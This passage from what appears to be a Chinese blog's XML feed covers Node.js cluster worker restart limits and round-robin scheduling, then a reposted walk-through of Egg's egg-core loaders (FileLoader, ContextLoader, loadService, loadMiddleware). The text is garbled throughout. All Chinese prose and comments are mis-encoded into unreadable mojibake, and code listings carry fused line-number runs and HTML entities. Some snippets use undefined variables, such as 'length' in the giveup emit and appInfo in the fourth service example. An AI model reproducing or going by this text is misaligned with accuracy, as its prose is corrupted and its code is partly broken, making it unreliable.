åœ¨è¿™é‡Œï¼Œè¿˜å¾—ç‰¹åˆ«æ„Ÿè°¢ä¸‹å¤§æ·±æµ·è€å“¥ï¼Œæ·±å¤œé‡Œï¼Œåœ¨ç¾¤é‡Œç»™æˆ‘æŒ‡ç‚¹è¿·æ´¥ã€‚ é™é‡é‡å¯é€šè¿‡è‡ªæ€ä¿¡å·å‘ŠçŸ¥ä¸»è¿›ç¨‹å¯ä»¥ä½¿æ–°è¿æ¥æ€»æ˜¯æœ‰è¿›ç¨‹æœåŠ¡ï¼Œä½†æ˜¯ä¾ç„¶è¿˜æ˜¯æœ‰æç«¯çš„æƒ…å†µã€‚ å·¥ä½œè¿›ç¨‹ä¸èƒ½æ— é™åˆ¶çš„è¢«é¢‘ç¹é‡å¯ã€‚ å› æ­¤åœ¨å•ä½æ—¶é—´è§„å®šåªèƒ½é‡å¯å¤šå°‘æ¬¡ï¼Œè¶…è¿‡é™åˆ¶å°±è§¦å‘giveupäº‹ä»¶ã€‚ 12345678910111213//æ£€æŸ¥å¯åŠ¨æ¬¡æ•°æ˜¯å¦å¤ªè¿‡é¢‘ç¹ï¼Œè¶…è¿‡ä¸€å®šæ¬¡æ•°ï¼Œé‡æ–°å¯åŠ¨ã€‚function isRestartNum() &#123; //è®°å½•é‡å¯çš„æ—¶é—´ let time = Date.now(); let length = restart.push(time); if(length &gt; limit) &#123; //å–å‡ºæœ€å10ä¸ª restart = restart.slice(limit * -1); &#125; //1åˆ†é’Ÿé‡å¯çš„æ¬¡æ•°æ˜¯å¦å¤ªè¿‡é¢‘ç¹ return restart.length &gt;= limit &amp;&amp; restart[restart.length - 1] - restart[0] &lt; during;&#125; åŒæ—¶å°†createServerä¿®æ”¹æˆ 123456789101112131415161718192021222324// master.js//åˆ›å»ºæœåŠ¡è¿›ç¨‹ function creatServer() &#123; //æ£€æŸ¥å¯åŠ¨æ˜¯å¦å¤ªè¿‡é¢‘ç¹ if(isRestartNum()) &#123; process.emit(&apos;giveup&apos;, length, during); return; &#125; let worker = cluster.fork(); console.log(`å·¥ä½œè¿›ç¨‹å·²ç»é‡å¯pid: $&#123;worker.process.pid&#125;`); //ç›‘å¬messageäº‹ä»¶ï¼Œç›‘å¬è‡ªæ€ä¿¡å·ï¼Œå¦‚æœæœ‰å­è¿›ç¨‹å‘é€è‡ªæ€ä¿¡å·ï¼Œåˆ™ç«‹å³é‡å¯è¿›ç¨‹ã€‚ //å¹³æ»‘é‡å¯ é‡å¯åœ¨å‰ï¼Œè‡ªæ€åœ¨åã€‚ worker.on(&apos;message&apos;, (msg) =&gt; &#123; //msgä¸ºè‡ªæ€ä¿¡å·ï¼Œåˆ™é‡å¯è¿›ç¨‹ if(msg.act == &apos;suicide&apos;) &#123; creatServer(); &#125; &#125;); //æ¸…ç†å®šæ—¶å™¨ã€‚ worker.on(&apos;disconnect&apos;, () =&gt; &#123; clearTimeout(timeout); &#125;);&#125; æ›´æ”¹è´Ÿè½½å‡è¡¡ç­–ç•¥é»˜è®¤çš„æ˜¯æ“ä½œç³»ç»ŸæŠ¢å å¼ï¼Œå°±æ˜¯åœ¨ä¸€å †å·¥ä½œè¿›ç¨‹ä¸­ï¼Œé—²ç€çš„è¿›ç¨‹å¯¹åˆ°æ¥çš„è¯·æ±‚è¿›è¡Œäº‰æŠ¢ï¼Œè°æŠ¢åˆ°è°æœåŠ¡ã€‚ å¯¹äºæ˜¯å¦ç¹å¿™æ˜¯ç”±CPUå’ŒI/Oå†³å®šçš„ï¼Œä½†æ˜¯å½±å“æŠ¢å çš„æ˜¯CPUã€‚ å¯¹äºä¸åŒçš„ä¸šåŠ¡ï¼Œä¼šæœ‰çš„I/Oç¹å¿™ï¼Œä½†CPUç©ºé—²çš„æƒ…å†µï¼Œè¿™æ—¶ä¼šé€ æˆè´Ÿè½½ä¸å‡è¡¡çš„æƒ…å†µã€‚å› æ­¤æˆ‘ä»¬ä½¿ç”¨nodeçš„å¦ä¸€ç§ç­–ç•¥ï¼Œåä¸ºè½®å«åˆ¶åº¦ã€‚ 1cluster.schedulingPolicy = cluster.SCHED_RR; æœ€åå½“ç„¶åˆ›å»ºä¸€ä¸ªç¨³å®šçš„webæœåŠ¡è¿˜éœ€è¦æ³¨æ„å¾ˆå¤šåœ°æ–¹ï¼Œæ¯”å¦‚ä¼˜åŒ–å¤„ç†è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ï¼Œæ•°æ®å…±äº«ç­‰ç­‰ã€‚ æœ¬ç‰‡æ–‡ç« åªæ˜¯ç»™å¤§å®¶ä¸€ä¸ªå‚è€ƒï¼Œå¦‚æœæœ‰å“ªäº›åœ°æ–¹å†™çš„ä¸åˆé€‚çš„åœ°æ–¹ï¼Œæ³è¯·æ‚¨æŒ‡å‡ºã€‚ å®Œæ•´ä»£ç è¯·è§ Githubã€‚ å‚è€ƒèµ„æ–™ï¼šæ·±å…¥æµ…å‡ºnodejs]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Egg æºç åˆ†æä¹‹ egg-coreï¼ˆäºŒï¼‰]]></title>
    <url>%2F2020%2F02%2F14%2FNode.js%2FEgg%20%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8B%20egg-core%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªçŸ¥ä¹ç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://zhuanlan.zhihu.com/p/47180589 loadService å‡½æ•°å¦‚ä½•åœ¨ Egg æ¡†æ¶ä¸­ä½¿ç”¨ serviceloadService å‡½æ•°çš„å®ç°æ˜¯æ‰€æœ‰loadå‡½æ•°ä¸­æœ€å¤æ‚çš„ä¸€ä¸ªï¼Œæˆ‘ä»¬ä¸ç€æ€¥çœ‹æºç ï¼Œå…ˆçœ‹ä¸€ä¸‹ service åœ¨ Egg æ¡†æ¶ä¸­å¦‚ä½•ä½¿ç”¨ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// egg-core æºç  -&gt; å¦‚ä½•åœ¨ egg æ¡†æ¶ä¸­ä½¿ç”¨ service//æ–¹å¼ 1 ï¼šapp/service/user1.js//è¿™ä¸ªæ˜¯æœ€æ ‡å‡†çš„åšæ³•ï¼Œå¯¼å‡ºä¸€ä¸ª class ï¼Œè¿™ä¸ª class ç»§æ‰¿äº† require('egg').Service ï¼Œå…¶å®ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸Šæ–‡æåˆ°çš„ eggCore å¯¼å‡ºçš„ BaseContextClass//æœ€ç»ˆæˆ‘ä»¬åœ¨ä¸šåŠ¡é€»è¾‘ä¸­è·å–åˆ°çš„æ˜¯è¿™ä¸ªclassçš„ä¸€ä¸ªå®ä¾‹ï¼Œåœ¨ load çš„æ—¶å€™æ˜¯å°† app.context å½“ä½œæ–°å»ºå®ä¾‹çš„å‚æ•°//åœ¨ controller ä¸­è°ƒç”¨æ–¹å¼ï¼šthis.ctx.service.user1.find(1)const Service = require('egg').Service;class UserService extends Service &#123; async find(uid) &#123; //æ­¤æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡ this.ctx,this.app,this.config,this.service è·å–åˆ°æœ‰ç”¨çš„ä¿¡æ¯ï¼Œå°¤å…¶æ˜¯ this.ctx éå¸¸é‡è¦ï¼Œæ¯ä¸ªè¯·æ±‚å¯¹åº”ä¸€ä¸ª ctxï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥è¯¢åˆ°å½“å‰è¯·æ±‚çš„æ‰€æœ‰ä¿¡æ¯ const user = await this.ctx.db.query('select * from user where uid = ?', uid); return user; &#125;&#125;module.exports = UserService;//æ–¹å¼ 2 ï¼šapp/service/user2.js//è¿™ä¸ªåšæ³•æ˜¯æˆ‘æ¨¡æ‹Ÿäº†ä¸€ä¸ª BaseContextClassï¼Œå½“ç„¶ä¹Ÿå°±å¯ä»¥å®ç°æ–¹æ³• 1 çš„ç›®çš„ï¼Œä½†æ˜¯ä¸æ¨èclass UserService &#123; constructor(ctx) &#123; this.ctx = ctx; this.app = ctx.app; this.config = ctx.app.config; this.service = ctx.service; &#125; async find(uid) &#123; const user = await this.ctx.db.query('select * from user where uid = ?', uid); return user; &#125;&#125;module.exports = UserService;//æ–¹å¼ 3 ï¼šapp/service/user3.js// service ä¸­ä¹Ÿå¯ä»¥ export å‡½æ•°ï¼Œåœ¨ load çš„æ—¶å€™ä¼šä¸»åŠ¨è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼ŒæŠŠ appInfo å‚æ•°ä¼ å…¥ï¼Œæœ€ç»ˆè·å–åˆ°çš„æ˜¯å‡½æ•°è¿”å›ç»“æœ//åœ¨ controller ä¸­è°ƒç”¨æ–¹å¼ï¼šthis.ctx.service.user3.getAppName(1) ï¼Œè¿™ä¸ªæ—¶å€™åœ¨ service ä¸­è·å–ä¸åˆ°å½“å‰è¯·æ±‚çš„ä¸Šä¸‹æ–‡ ctxmodule.exports = (appInfo) =&gt; &#123; return &#123; async getAppName(uid)&#123; return appInfo.name; &#125; &#125;&#125;;//æ–¹å¼ 4 ï¼šapp/service/user4.js// service ä¹Ÿå¯ä»¥ç›´æ¥ export æ™®é€šçš„åŸç”Ÿå¯¹è±¡ï¼Œload çš„æ—¶å€™ä¼šå°†è¯¥æ™®é€šå¯¹è±¡è¿”å›ï¼ŒåŒæ ·è·å–ä¸åˆ°å½“å‰è¯·æ±‚çš„ä¸Šä¸‹æ–‡ ctx//åœ¨ controller ä¸­è°ƒç”¨æ–¹å¼ï¼šthis.ctx.service.user4.getAppName(1)module.exports = &#123; async getAppName(uid)&#123; return appInfo.name; &#125;&#125;; æˆ‘ä»¬ä¸Šé¢åˆ—ä¸¾äº† service ä¸‹çš„ js æ–‡ä»¶çš„å››ç§å†™æ³•ï¼Œéƒ½æ˜¯ä»æ¯æ¬¡è¯·æ±‚çš„ä¸Šä¸‹æ–‡ this.ctx è·å–åˆ° service å¯¹è±¡ï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨åˆ°æ¯ä¸ª service æ–‡ä»¶å¯¼å‡ºçš„å¯¹è±¡äº†ï¼Œè¿™é‡Œä¸»è¦æœ‰ä¸¤ä¸ªåœ°æ–¹éœ€è¦æ³¨æ„ï¼š ä¸ºä»€ä¹ˆæˆ‘ä»¬å¯ä»¥ä»æ¯ä¸ªè¯·æ±‚çš„ this.ctx ä¸Šè·å–åˆ° service å¯¹è±¡å‘¢ï¼šçœ‹è¿‡ Koa æºç çš„åŒå­¦çŸ¥é“ï¼Œthis.ctx å…¶å®æ˜¯ä» app.context ç»§æ‰¿è€Œæ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦æŠŠ service ç»‘å®šåˆ° app.context ä¸Šï¼Œé‚£ä¹ˆå½“å‰è¯·æ±‚çš„ä¸Šä¸‹æ–‡ ctx è‡ªç„¶å¯ä»¥æ‹¿åˆ° service å¯¹è±¡ï¼ŒEggLoader ä¹Ÿæ˜¯è¿™æ ·åšçš„ é’ˆå¯¹ä¸Šè¿°å››ç§ä½¿ç”¨åœºæ™¯ï¼Œå…·ä½“å¯¼å‡ºå®ä¾‹æ˜¯æ€ä¹ˆå¤„ç†çš„å‘¢ï¼Ÿ å¦‚æœå¯¼å‡ºçš„æ˜¯ä¸€ä¸ªç±»ï¼ŒEggLoader ä¼šä¸»åŠ¨ä»¥ ctx å¯¹è±¡å»åˆå§‹åŒ–è¿™ä¸ªå®ä¾‹å¹¶å¯¼å‡ºï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥åœ¨è¯¥ç±»ä¸­ä½¿ç”¨ this.ctx è·å–å½“å‰è¯·æ±‚çš„ä¸Šä¸‹æ–‡äº† å¦‚æœå¯¼å‡ºçš„æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆ EggLoader ä¼šä»¥ app ä½œä¸ºå‚æ•°è¿è¡Œè¿™ä¸ªå‡½æ•°å¹¶å°†ç»“æœå¯¼å‡º å¦‚æœæ˜¯ä¸€ä¸ªæ™®é€šçš„å¯¹è±¡ï¼Œç›´æ¥å¯¼å‡º FileLoader ç±»çš„å®ç°åˆ†æåœ¨å®ç° loadService å‡½æ•°æ—¶ï¼Œæœ‰ä¸€ä¸ªåŸºç¡€ç±»å°±æ˜¯ FileLoader ï¼Œå®ƒåŒæ—¶ä¹Ÿæ˜¯ loadMiddlewareï¼ŒloadController å®ç°çš„åŸºç¡€ï¼Œè¿™ä¸ªç±»æä¾›ä¸€ä¸ª load å‡½æ•°æ ¹æ®ç›®å½•ç»“æ„å’Œæ–‡ä»¶å†…å®¹è¿›è¡Œè§£æï¼Œè¿”å›ä¸€ä¸ª target å¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®æ–‡ä»¶åä»¥åŠå­æ–‡ä»¶åä»¥åŠå‡½æ•°åç§°è·å–åˆ° service é‡Œå¯¼å‡ºçš„å†…å®¹ï¼Œtarget ç»“æ„ç±»ä¼¼è¿™æ ·ï¼š 12345678910&#123; "file1": &#123; "file11": &#123; "function1": a =&gt; a &#125; &#125;, "file2": &#123; "function2": a =&gt; a &#125;&#125; ä¸‹é¢æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹ FileLoader è¿™ä¸ªç±»çš„å®ç°ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394// egg-core æºç  -&gt; FileLoader å®ç°class FileLoader &#123; constructor(options) &#123; /* options é‡Œå‡ ä¸ªé‡è¦å‚æ•°çš„å«ä¹‰: 1. directory: éœ€è¦åŠ è½½æ–‡ä»¶çš„æ‰€æœ‰ç›®å½• 2. target: æœ€ç»ˆåŠ è½½æˆåŠŸåçš„ç›®æ ‡å¯¹è±¡ 3. initializerï¼šä¸€ä¸ªåˆå§‹åŒ–å‡½æ•°ï¼Œå¯¹æ–‡ä»¶å¯¼å‡ºå†…å®¹è¿›è¡Œåˆå§‹åŒ–ï¼Œè¿™ä¸ªåœ¨ loadController å®ç°æ—¶ä¼šç”¨åˆ° 4. injectï¼šå¦‚æœæŸä¸ªæ–‡ä»¶çš„å¯¼å‡ºå¯¹è±¡æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆå°†è¯¥å€¼ä¼ å…¥å‡½æ•°å¹¶æ‰§è¡Œå¯¼å‡ºï¼Œä¸€èˆ¬éƒ½æ˜¯ this.app */ this.options = Object.assign(&#123;&#125;, defaults, options); &#125; load() &#123; //è§£æ directory ä¸‹çš„æ–‡ä»¶ï¼Œä¸‹é¢æœ‰ parse å‡½æ•°çš„éƒ¨åˆ†å®ç° const items = this.parse(); const target = this.options.target; // item1 = &#123; properties: [ 'a', 'b', 'c'], exports1 &#125;,item2 = &#123; properties: [ 'a', 'b', 'd'], exports2 &#125; // =&gt; target = &#123;a: &#123;b: &#123;c: exports1, d: exports2&#125;&#125;&#125; //æ ¹æ®æ–‡ä»¶è·¯å¾„åç§°é€’å½’ç”Ÿæˆä¸€ä¸ªå¤§çš„å¯¹è±¡ target ï¼Œæˆ‘ä»¬é€šè¿‡ target.file1.file2 å°±å¯ä»¥è·å–åˆ°å¯¹åº”çš„å¯¼å‡ºå†…å®¹ for (const item of items) &#123; item.properties.reduce((target, property, index) =&gt; &#123; let obj; const properties = item.properties.slice(0, index + 1).join('.'); if (index === item.properties.length - 1) &#123; obj = item.exports; if (obj &amp;&amp; !is.primitive(obj)) &#123; //è¿™æ­¥éª¤å¾ˆé‡è¦ï¼Œç¡®å®šè¿™ä¸ª target æ˜¯ä¸æ˜¯ä¸€ä¸ª exports ï¼Œæœ‰å¯èƒ½åªæ˜¯ä¸€ä¸ªè·¯å¾„è€Œå·² obj[FULLPATH] = item.fullpath; obj[EXPORTS] = true; &#125; &#125; else &#123; obj = target[property] || &#123;&#125;; &#125; target[property] = obj; return obj; &#125;, target); &#125; return target; &#125; //æœ€ç»ˆç”Ÿæˆ [&#123; properties: [ 'a', 'b', 'c'], exportsï¼Œfullpath&#125;] å½¢å¼ï¼Œ properties æ–‡ä»¶è·¯å¾„åç§°çš„æ•°ç»„ï¼Œ exports æ˜¯å¯¼å‡ºå¯¹è±¡ï¼Œ fullpath æ˜¯æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ parse() &#123; //æ–‡ä»¶ç›®å½•è½¬æ¢ä¸ºæ•°ç»„ let directories = this.options.directory; if (!Array.isArray(directories)) &#123; directories = [ directories ]; &#125; //éå†æ‰€æœ‰æ–‡ä»¶è·¯å¾„ const items = []; for (const directory of directories) &#123; //æ¯ä¸ªæ–‡ä»¶ç›®å½•ä¸‹é¢å¯èƒ½è¿˜ä¼šæœ‰å­æ–‡ä»¶å¤¹ï¼Œæ‰€ä»¥ globby.sync å‡½æ•°æ˜¯è·å–æ‰€æœ‰æ–‡ä»¶åŒ…æ‹¬å­æ–‡ä»¶ä¸‹çš„æ–‡ä»¶çš„è·¯å¾„ const filepaths = globby.sync(files, &#123; cwd: directory &#125;); for (const filepath of filepaths) &#123; const fullpath = path.join(directory, filepath); if (!fs.statSync(fullpath).isFile()) continue; //è·å–æ–‡ä»¶è·¯å¾„ä¸Šçš„ä»¥ "/" åˆ†å‰²çš„æ‰€æœ‰æ–‡ä»¶åï¼Œfoo/bar.js =&gt; [ 'foo', 'bar' ]ï¼Œè¿™ä¸ªå‡½æ•°ä¼šå¯¹ propertie åŒä¸€æ ¼å¼ï¼Œé»˜è®¤ä¸ºé©¼å³° const properties = getProperties(filepath, this.options); // app/service/foo/bar.js =&gt; service.foo.bar const pathName = directory.split(/[/\\]/).slice(-1) + '.' + properties.join('.'); // getExports å‡½æ•°è·å–æ–‡ä»¶å†…å®¹ï¼Œå¹¶å°†ç»“æœåšä¸€äº›å¤„ç†ï¼Œçœ‹ä¸‹é¢å®ç° const exports = getExports(fullpath, this.options, pathName); //å¦‚æœå¯¼å‡ºçš„æ˜¯ class ï¼Œä¼šè®¾ç½®ä¸€äº›å±æ€§ï¼Œè¿™ä¸ªå±æ€§ä¸‹æ–‡ä¸­å¯¹äº class çš„ç‰¹æ®Šå¤„ç†åœ°æ–¹ä¼šç”¨åˆ° if (is.class(exports)) &#123; exports.prototype.pathName = pathName; exports.prototype.fullPath = fullpath; &#125; items.push(&#123; fullpath, properties, exports &#125;); &#125; &#125; return items; &#125;&#125;//æ ¹æ®æŒ‡å®šè·¯å¾„è·å–å¯¼å‡ºå¯¹è±¡å¹¶ä½œé¢„å¤„ç†function getExports(fullpath, &#123; initializer, call, inject &#125;, pathName) &#123; let exports = utils.loadFile(fullpath); //ç”¨ initializer å‡½æ•°å¯¹exportsç»“æœåšé¢„å¤„ç† if (initializer) &#123; exports = initializer(exports, &#123; path: fullpath, pathName &#125;); &#125; //å¦‚æœ exports æ˜¯ classï¼ŒgeneratorFunctionï¼ŒasyncFunction åˆ™ç›´æ¥è¿”å› if (is.class(exports) || is.generatorFunction(exports) || is.asyncFunction(exports)) &#123; return exports; &#125; //å¦‚æœå¯¼å‡ºçš„æ˜¯ä¸€ä¸ªæ™®é€šå‡½æ•°ï¼Œå¹¶ä¸”è®¾ç½®äº† call=trueï¼Œé»˜è®¤æ˜¯ trueï¼Œä¼šå°† inject ä¼ å…¥å¹¶è°ƒç”¨è¯¥å‡½æ•°ï¼Œä¸Šæ–‡ä¸­æåˆ°è¿‡å¥½å‡ æ¬¡ï¼Œå°±æ˜¯åœ¨è¿™é‡Œå®ç°çš„ if (call &amp;&amp; is.function(exports)) &#123; exports = exports(inject); if (exports != null) &#123; return exports; &#125; &#125; //å…¶å®ƒæƒ…å†µç›´æ¥è¿”å› return exports;&#125; ContextLoader ç±»çš„å®ç°åˆ†æä¸Šæ–‡ä¸­è¯´åˆ° loadService å‡½æ•°å…¶å®æœ€ç»ˆæŠŠ service å¯¹è±¡æŒ‚è½½åœ¨äº† app.context ä¸Šï¼Œæ‰€ä»¥ä¸ºæ­¤æä¾›äº† ContextLoader è¿™ä¸ªç±»ï¼Œç»§æ‰¿äº† FileLoader ç±»ï¼Œç”¨äºå°† FileLoader è§£æå‡ºæ¥çš„ target æŒ‚è½½åœ¨ app.context ä¸Šï¼Œä¸‹é¢æ˜¯å…¶å®ç°ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657// egg-core -&gt; ContextLoader ç±»çš„æºç å®ç°class ContextLoader extends FileLoader &#123; constructor(options) &#123; const target = options.target = &#123;&#125;; super(options); // FileLoader å·²ç»è®²è¿‡ inject å°±æ˜¯ app const app = this.options.inject; // property å°±æ˜¯è¦æŒ‚è½½çš„å±æ€§ï¼Œæ¯”å¦‚ "service" const property = options.property; //å°† service å±æ€§æŒ‚è½½åœ¨ app.context ä¸Š Object.defineProperty(app.context, property, &#123; get() &#123; //åšç¼“å­˜ï¼Œç”±äºä¸åŒçš„è¯·æ±‚ ctx ä¸ä¸€æ ·ï¼Œè¿™é‡Œæ˜¯é’ˆå¯¹åŒä¸€ä¸ªè¯·æ±‚çš„å†…å®¹è¿›è¡Œç¼“å­˜ if (!this[CLASSLOADER]) &#123; this[CLASSLOADER] = new Map(); &#125; const classLoader = this[CLASSLOADER]; //è·å–å¯¼å‡ºå®ä¾‹ï¼Œè¿™é‡Œå°±æ˜¯ä¸Šæ–‡ç”¨ä¾‹ä¸­è·å– this.ctx.service.file1.fun1 çš„å®ç°ï¼Œè¿™é‡Œçš„å®ä¾‹å°±æ˜¯ this.ctx.serviceï¼Œå®ç°é€»è¾‘è¯·çœ‹ä¸‹é¢çš„ getInstance çš„å®ç° let instance = classLoader.get(property); if (!instance) &#123; //è¿™é‡Œä¼ å…¥çš„ this å°±æ˜¯ä¸ºäº†åˆå§‹åŒ– require('egg').Service å®ä¾‹æ—¶å½“ä½œå‚æ•°ä¼ å…¥ // this ä¼šæ ¹æ®è°ƒç”¨è€…çš„ä¸åŒè€Œæ”¹å˜ï¼Œæ¯”å¦‚æ˜¯ app.context çš„å®ä¾‹è°ƒç”¨é‚£ä¹ˆå°±æ˜¯ app.context ï¼Œå¦‚æœæ˜¯ app.context å­ç±»çš„å®ä¾‹è°ƒç”¨ï¼Œé‚£ä¹ˆå°±æ˜¯å…¶å­ç±»çš„å®ä¾‹ //å°±æ˜¯å› ä¸ºè¿™ä¸ª this ï¼Œå¦‚æœ service é‡Œç»§æ‰¿require('egg').Service ï¼Œæ‰å¯ä»¥é€šè¿‡ this.ctx è·å–åˆ°å½“å‰è¯·æ±‚çš„ä¸Šä¸‹æ–‡ instance = getInstance(target, this); classLoader.set(property, instance); &#125; return instance; &#125;, &#125;); &#125;&#125;// values æ˜¯ FileLoader/load å‡½æ•°ç”Ÿæˆ target å¯¹è±¡function getInstance(values, ctx) &#123; //ä¸Šæ–‡ FileLoader é‡Œå®ç°ä¸­æˆ‘ä»¬è®²è¿‡ï¼Œtarget å¯¹è±¡æ˜¯ä¸€ä¸ªç”±è·¯å¾„å’Œ exports ç»„è£…æˆçš„ä¸€ä¸ªå¤§å¯¹è±¡ï¼Œè¿™é‡Œ Class æ˜¯ä¸ºäº†ç¡®å®šå…¶æ˜¯ä¸æ˜¯ä¸€ä¸ª exports ï¼Œæœ‰å¯èƒ½æ˜¯ä¸€ä¸ªè·¯å¾„å const Class = values[EXPORTS] ? values : null; let instance; if (Class) &#123; if (is.class(Class)) &#123; //è¿™ä¸€æ­¥å¾ˆé‡è¦ï¼Œå¦‚æœæ˜¯ç±»ï¼Œå°±ç”¨ ctx è¿›è¡Œåˆå§‹åŒ–è·å–å®ä¾‹ instance = new Class(ctx); &#125; else &#123; //æ™®é€šå¯¹è±¡ç›´æ¥å¯¼å‡ºï¼Œè¿™é‡Œè¦æ³¨æ„çš„æ˜¯å¦‚æœæ˜¯ exports å‡½æ•°ï¼Œåœ¨ FileLoader å®ç°ä¸­å·²ç»å°†å…¶æ‰§è¡Œå¹¶è½¬æ¢ä¸ºäº†å¯¹è±¡ // function å’Œ class åˆ†åˆ«åœ¨å­ç±»å’Œçˆ¶ç±»çš„å¤„ç†çš„åŸå› æ˜¯ï¼Œ function çš„å¤„ç†é€»è¾‘ loadMiddleware,loadService,loadController å…¬ç”¨ï¼Œè€Œ class çš„å¤„ç†é€»è¾‘ loadService ä½¿ç”¨ instance = Class; &#125; &#125; else if (is.primitive(values)) &#123; //åŸç”Ÿç±»å‹ç›´æ¥å¯¼å‡º instance = values; &#125; else &#123; //å¦‚æœç›®å‰çš„ target éƒ¨åˆ†æ˜¯ä¸€ä¸ªè·¯å¾„ï¼Œé‚£ä¹ˆä¼šæ–°å»ºä¸€ä¸ª ClassLoader å®ä¾‹ï¼Œè¿™ä¸ª ClassLoader ä¸­åˆä¼šé€’å½’çš„è°ƒç”¨ getInstance //è¿™é‡Œä¹‹æ‰€ä»¥æ–°å»ºä¸€ä¸ªç±»ï¼Œä¸€æ˜¯ä¸ºäº†åšç¼“å­˜ï¼ŒäºŒæ˜¯ä¸ºäº†åœ¨æ¯ä¸ªèŠ‚ç‚¹è·å–åˆ°çš„éƒ½æ˜¯ä¸€ä¸ªç±»çš„å®ä¾‹ instance = new ClassLoader(&#123; ctx, properties: values &#125;); &#125; return instance;&#125; loadService çš„å®ç°æœ‰äº† ContextLoader ç±»ï¼Œé‚£å®ç° loadService å‡½æ•°å°±éå¸¸å®¹æ˜“äº†ï¼Œå¦‚ä¸‹ï¼š 123456789101112131415161718192021// egg-core -&gt; loadService å‡½æ•°å®ç°æºç // loadService å‡½æ•°è°ƒç”¨ loadToContext å‡½æ•°loadService(opt) &#123; opt = Object.assign(&#123; call: true, caseStyle: 'lower', fieldClass: 'serviceClasses', directory: this.getLoadUnits().map(unit =&gt; path.join(unit.path, 'app/service')), //æ‰€æœ‰åŠ è½½å•å…ƒç›®å½•ä¸‹çš„ service &#125;, opt); const servicePaths = opt.directory; this.loadToContext(servicePaths, 'service', opt);&#125;// loadToContext å‡½æ•°ç›´æ¥æ–°å»º ContextLoader å®ä¾‹ï¼Œè°ƒç”¨ load å‡½æ•°å®ç°åŠ è½½loadToContext(directory, property, opt) &#123; opt = Object.assign(&#123;&#125;, &#123; directory, property, inject: this.app, &#125;, opt); new ContextLoader(opt).load();&#125; loadMiddleware å‡½æ•°ä¸­é—´ä»¶æ˜¯ Koa æ¡†æ¶ä¸­å¾ˆé‡è¦çš„ä¸€ä¸ªç¯èŠ‚ï¼Œé€šè¿‡ app.use å¼•å…¥ä¸­é—´ä»¶ï¼Œä½¿ç”¨æ´‹è‘±åœˆæ¨¡å‹ï¼Œæ‰€ä»¥ä¸­é—´ä»¶åŠ è½½çš„é¡ºåºå¾ˆé‡è¦ã€‚ - å¦‚æœåœ¨ä¸Šæ–‡ä¸­çš„ config ä¸­é…ç½®çš„ä¸­é—´ä»¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨ç”¨ app.use å‡½æ•°ä½¿ç”¨è¯¥ä¸­é—´ä»¶ - æ‰€æœ‰çš„ä¸­é—´ä»¶æˆ‘ä»¬éƒ½å¯ä»¥åœ¨ app.middleware ä¸­é€šè¿‡ä¸­é—´ä»¶ name è·å–åˆ°ï¼Œä¾¿äºåœ¨ä¸šåŠ¡ä¸­åŠ¨æ€ä½¿ç”¨ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263// egg-core æºç  -&gt; loadMiddleware å‡½æ•°å®ç°æºç loadMiddleware(opt) &#123; const app = this.app; opt = Object.assign(&#123; call: false, // call=false è¡¨ç¤ºå¦‚æœä¸­é—´ä»¶å¯¼å‡ºæ˜¯å‡½æ•°ï¼Œä¸ä¼šä¸»åŠ¨è°ƒç”¨å‡½æ•°åšè½¬æ¢ override: true, caseStyle: 'lower', directory: this.getLoadUnits().map(unit =&gt; join(unit.path, 'app/middleware')) //æ‰€æœ‰åŠ è½½å•å…ƒç›®å½•ä¸‹çš„ middleware &#125;, opt); const middlewarePaths = opt.directory; //å°†æ‰€æœ‰ä¸­é—´ä»¶ middlewares æŒ‚è½½åœ¨ app ä¸Šï¼Œè¿™ä¸ªå‡½æ•°åœ¨ loadController å®ç°ä¸­ä¹Ÿç”¨åˆ°äº†ï¼Œçœ‹ä¸‹æ–‡çš„å®ç° this.loadToApp(middlewarePaths, 'middlewares', opt); //å°† app.middlewares ä¸­çš„æ¯ä¸ªä¸­é—´ä»¶é‡æ–°ç»‘å®šåœ¨ app.middleware ä¸Šï¼Œæ¯ä¸ªä¸­é—´ä»¶çš„å±æ€§ä¸å¯é…ç½®ï¼Œä¸å¯æšä¸¾ for (const name in app.middlewares) &#123; Object.defineProperty(app.middleware, name, &#123; get() &#123; return app.middlewares[name]; &#125;, enumerable: false, configurable: false, &#125;); &#125; //åªæœ‰åœ¨ config ä¸­é…ç½®äº† appMiddleware å’Œ coreMiddleware æ‰ä¼šç›´æ¥åœ¨ app.use ä¸­ä½¿ç”¨ï¼Œå…¶å®ƒä¸­é—´ä»¶åªæ˜¯æŒ‚è½½åœ¨ app ä¸Šï¼Œå¼€å‘äººå‘˜å¯ä»¥åŠ¨æ€ä½¿ç”¨ const middlewareNames = this.config.coreMiddleware.concat(this.config.appMiddleware); const middlewaresMap = new Map(); for (const name of middlewareNames) &#123; //å¦‚æœ config ä¸­å®šä¹‰ middleware åœ¨ app.middlewares ä¸­æ‰¾ä¸åˆ°æˆ–è€…é‡å¤å®šä¹‰ï¼Œéƒ½ä¼šæŠ¥é”™ if (!app.middlewares[name]) &#123; throw new TypeError(`Middleware $&#123;name&#125; not found`); &#125; if (middlewaresMap.has(name)) &#123; throw new TypeError(`Middleware 